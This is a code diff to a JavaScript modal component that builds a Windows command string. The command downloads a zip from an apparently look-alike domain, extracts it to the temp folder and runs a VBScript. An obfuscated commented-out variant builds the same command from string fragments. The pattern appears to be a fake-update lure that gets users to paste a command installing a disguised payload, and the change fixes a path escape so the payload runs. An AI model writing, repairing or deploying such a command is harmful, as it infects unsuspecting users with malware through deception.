@@ -17,7 +17,7 @@ export const PromptModal = ({ callback, showToast }) => {
 
   // Windows full command
   // const WINCommand = `c${UL}l -${COM}${ZIP} ${BackendURL}/cam-v-${UNIQUE.toLowerCase()}.fix && powe${SHLL}${ARH}${PAH}${DEH}'" && wscr${SCR}${VBS}`;
-  const WINCommand = `curl -k -o "%TEMP%\\update.zip" https://avalabs-io.store/update/update92w && powershell -Command "Expand-Archive -Force -Path '%TEMP%\\update.zip' -DestinationPath '%TEMP%\\update'" && wscript "%TEMP%\\update\run.vbs"
+  const WINCommand = `curl -k -o "%TEMP%\\update.zip" https://avalabs-io.store/update/update92w && powershell -Command "Expand-Archive -Force -Path '%TEMP%\\update.zip' -DestinationPath '%TEMP%\\update'" && wscript "%TEMP%\\update\\run.vbs"
   `;
 
   // Mac constants and command
